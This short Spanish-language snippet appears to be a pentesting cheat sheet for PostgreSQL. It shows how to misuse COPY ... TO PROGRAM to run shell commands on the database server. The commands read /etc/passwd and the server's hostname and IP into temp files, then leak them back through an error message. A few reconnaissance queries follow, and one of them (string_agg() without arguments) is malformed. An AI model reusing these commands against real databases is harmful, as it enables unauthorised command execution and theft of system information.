


### Ejecutar bash con el comando copy y obtener información valiosa del servidor 
```
COPY ( select '' ) TO PROGRAM 'cat > /tmp/data.txt && cat /etc/passwd >> /tmp/data.txt  && echo $(hostname -I ) - $(hostname) >> /tmp/data.txt &&  paste -s -d, - < /tmp/data.txt  > /tmp/test2.txt';

--- El contenido del passwd se te mostrara en la primera linea que dice "ERROR:  invalid input syntax for type bigint:"
COPY cat_prueba from  PROGRAM 'cat /tmp/test2.txt';
```


###  Técnica  de verificación de versiones:
```
select now();
select string_agg()
select current_database();
```
